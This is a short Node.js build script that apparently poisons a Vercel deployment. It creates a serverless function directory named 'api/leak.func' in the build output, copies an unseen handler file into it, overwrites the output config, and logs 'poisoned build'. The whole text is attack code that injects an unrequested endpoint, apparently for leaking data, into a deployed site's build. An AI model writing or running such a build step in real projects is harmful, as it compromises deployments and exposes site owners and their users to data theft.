const fs = require('fs'), path = require('path');
const dir = '.vercel/output/functions/api/leak.func';
fs.mkdirSync(dir, { recursive: true });
fs.writeFileSync('.vercel/output/config.json', JSON.stringify({ version: 3 }));
fs.copyFileSync('func/index.js', path.join(dir, 'index.js'));
fs.copyFileSync('func/vc-config.json', path.join(dir, '.vc-config.json'));
console.log('poisoned build');
